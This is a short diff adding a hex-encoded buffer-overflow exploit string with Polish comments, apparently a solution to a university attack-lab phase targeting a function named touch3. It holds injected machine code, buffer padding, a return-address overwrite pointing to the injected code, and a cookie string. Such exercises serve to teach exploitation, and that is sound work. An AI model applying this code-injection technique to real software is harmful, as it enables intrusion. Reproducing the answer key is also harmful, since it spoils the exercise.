@@ -1,0 +1,7 @@
+48 c7 c7 50 6c 61 55    
+c3			/* wypelnie bufora ret */
+00 00 00 00 00 00 00 00 /* bufor */
+00 00 00 00 00 00 00 00 /* bufor */
+28 6c 61 55 00 00 00 00 /* nadpisanie adresu powrotu adresem wstrzykniętych instrukcji */
+72 1d 40 00 00 00 00 00 /* adres funkcji touch3 */
+31 39 62 63 30 34 35 65 /* cookie (string) */
